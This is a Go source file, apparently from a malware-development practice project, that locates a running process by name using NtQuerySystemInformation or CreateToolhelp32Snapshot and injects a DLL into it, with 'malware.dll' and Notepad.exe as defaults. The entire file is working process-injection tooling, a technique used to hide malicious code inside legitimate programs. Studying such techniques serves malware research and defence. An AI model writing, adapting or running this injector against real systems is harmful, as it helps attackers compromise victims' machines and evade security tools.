package main

import (
	"errors"
	"flag"
	"fmt"
	"log"

	"github.com/mortimus/maldev/pkg/maldev"
)

func main() {
	maldev.DEBUG = true
	// get process name from flags
	processName := flag.String("process", "Notepad.exe", "Process name to inject into")
	dllName := flag.String("dll", "malware.dll", "DLL to inject")
	method := flag.Int("method", 1, "Method to use for process enumeration (1: NtQuerySystemInformation, 2: CreateToolhelp32Snapshot)")
	flag.Parse()

	// Enumerate processes and inject
	pHandle, err := selectEnum(*method, processName)
	if err != nil {
		log.Fatalf("Failed to get process handle: %s\n", err)
	}

	// Injection
	var wDLLName maldev.LPWSTR
	err = wDLLName.Set(*dllName)
	if err != nil {
		log.Fatalf("Failed to convert DLL name to LPWSTR: %s\n", err)
	}
	maldev.Debugf("Injecting %s into %s\n", *dllName, *processName)
	maldev.DebugWait("Inject")
	err = maldev.InjectDllToRemoteProcess(pHandle, wDLLName)
	if err != nil {
		log.Fatalf("Failed to inject DLL: %s\n", err)
	}
}

func EnumNtQuerySystemInformation(processName *string) (maldev.HANDLE, error) {
	// Get process handle
	pid, hProcess, err := maldev.GetRemoteProcessHandleNtQuerySystemInformation(*processName)
	if err != nil {
		fmt.Printf("[!] Error: %s\n", err)
		return maldev.NULL, err
	}
	fmt.Printf("[+] Found process %s with PID: %d, Handle: %d\n", *processName, pid, hProcess)
	return hProcess, nil
}

func EnumGetRemoteProcessHandle(processName *string) (maldev.HANDLE, error) {
	pHandle, err := maldev.GetRemoteProcessHandleCreateToolhelp32Snapshot(*processName)
	if err != nil {
		return maldev.NULL, errors.New("Error getting process handle" + err.Error())
	}
	fmt.Printf("Process Handle: %d\n", pHandle)
	return pHandle, nil
}

func selectEnum(method int, processName *string) (maldev.HANDLE, error) {
	if method == 1 {
		return EnumNtQuerySystemInformation(processName)
	}
	return EnumGetRemoteProcessHandle(processName)
}
